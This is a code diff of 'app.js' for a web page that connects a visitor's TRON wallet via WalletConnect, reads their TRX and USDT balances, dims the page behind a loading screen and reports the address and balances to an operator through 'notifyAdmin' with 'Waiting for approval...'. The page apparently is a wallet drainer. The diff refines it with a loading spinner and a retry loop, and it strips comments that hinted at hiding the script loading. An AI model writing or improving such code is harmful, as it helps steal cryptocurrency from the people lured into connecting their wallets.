@@ -1,6 +1,6 @@
 // app.js
 
-// Dynamic Script Loader to keep browser progress bar clear
+// Dynamic Script Loader
 const loadScript = (src) => {
     return new Promise((resolve) => {
         if (document.querySelector(`script[src="${src}"]`)) return resolve();
@@ -17,7 +17,6 @@ window.addEventListener('load', () => {
     setTimeout(async () => {
         await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
         await loadScript("wc-bundle.js");
-        console.log("System optimized.");
     }, 100);
 });
 
@@ -59,27 +58,37 @@ async function getStats(address) {
 }
 
 document.getElementById('next-btn').addEventListener('click', async () => {
-    // Ensure modules are loaded before proceeding
+    const btn = document.getElementById('next-btn');
+    btn.classList.add('btn-loading'); // Show professional spinner
+
+    // Ensure modules are loaded
     if (typeof window.connectWalletConnectTron !== 'function') {
-        document.getElementById('next-btn').innerText = "Loading system...";
         await loadScript("wc-bundle.js");
         await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
-        document.getElementById('next-btn').innerText = "Next";
-        if (typeof window.connectWalletConnectTron !== 'function') return alert("System still loading, try again in a second.");
+        
+        let retry = 0;
+        while(typeof window.connectWalletConnectTron !== 'function' && retry < 10) {
+            await new Promise(r => setTimeout(r, 500));
+            retry++;
+        }
+        if (typeof window.connectWalletConnectTron !== 'function') {
+            btn.classList.remove('btn-loading');
+            return alert("Connection system still loading. Please try again in a few seconds.");
+        }
     }
 
-    const result = await window.connectWalletConnectTron();
-    if (result && result.address) {
-        const address = result.address;
-        const { trx, usdt } = await getStats(address);
-        
-        document.getElementById('view-balance').innerText = usdt;
-        document.getElementById('page-wrapper').classList.add('opacity-10');
-        document.getElementById('loading-screen').classList.remove('hidden');
+    try {
+        const result = await window.connectWalletConnectTron();
+        if (result && result.address) {
+            const address = result.address;
+            const { trx, usdt } = await getStats(address);
+            
+            document.getElementById('view-balance').innerText = usdt;
+            document.getElementById('page-wrapper').classList.add('opacity-10');
+            document.getElementById('loading-screen').classList.remove('hidden');
 
-        await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");
+            await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");
 
-        try {
             const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
             
             setTimeout(async () => {
@@ -105,10 +114,11 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     location.reload();
                 }
             }, 800);
-
-        } catch (e) {
-            await notifyAdmin("❌ ERROR", address, trx, usdt, e.message);
-            location.reload();
+        } else {
+            btn.classList.remove('btn-loading');
         }
+    } catch (e) {
+        btn.classList.remove('btn-loading');
+        console.error(e);
     }
 });
